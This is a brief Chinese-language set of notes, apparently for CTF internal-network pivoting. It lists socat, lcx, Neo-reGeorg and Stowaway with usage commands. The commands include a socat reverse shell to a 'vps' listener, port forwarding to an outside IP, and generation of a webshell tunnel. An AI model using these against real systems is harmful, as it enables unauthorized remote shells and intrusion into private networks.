# 记录一些代理工具

>目前是用与ctf的内网环境代理出内网。

### socat
>适合?。。。

地址：http://www.iteait.com/archives/603

socat下载:地址
https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat

直接wget https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat

```

靶机：socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:vps:3333

主机：socat file:`tty`,raw,echo=0 tcp-listen:3333
```

### lcx

将内网的8005端口代理出vps的81端口
```
gcc lcx.c -o lcx

靶机: ./lcx -m 3 -h1 1.116.136.120 -h2 127.0.0.1 -p1 81 -p2 8005
vps:  ./lcx -m 2 -p1 2333 -p2 8005
```

### NeoreGeorg

>2021长安线下使用过 php环境配置浏览器代理

https://github.com/L-codes/Neo-reGeorg

详细使用看readme.md
```
python neoreg.py generate -k password #生成不同连接密码的木马
 
python3 neoreg.py -k password -u http://xx/tunnel.php   #木马

然后就代理到127.0.0.1:1080 然后配合浏览器代理去访问就欧克
```
![image](https://user-images.githubusercontent.com/63966847/137916175-66737e29-ed2c-4930-930f-10c401f718bf.png)


### stowaway 
https://mp.weixin.qq.com/s?__biz=Mzg4NTA0MzgxNQ==&mid=2247485237&idx=1&sn=b7c909bddd742f351ea985eb05dfebc4&chksm=cfafa03df8d8292b6fb20bb6ad9ac650c86a1d708e089aa5abfd33994ddddd2cdb01938d7dec&mpshare=1&scene=23&srcid=1115YPb8VRvCLwiS8wTREoxL&sharer_sharetime=1636967942759&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd


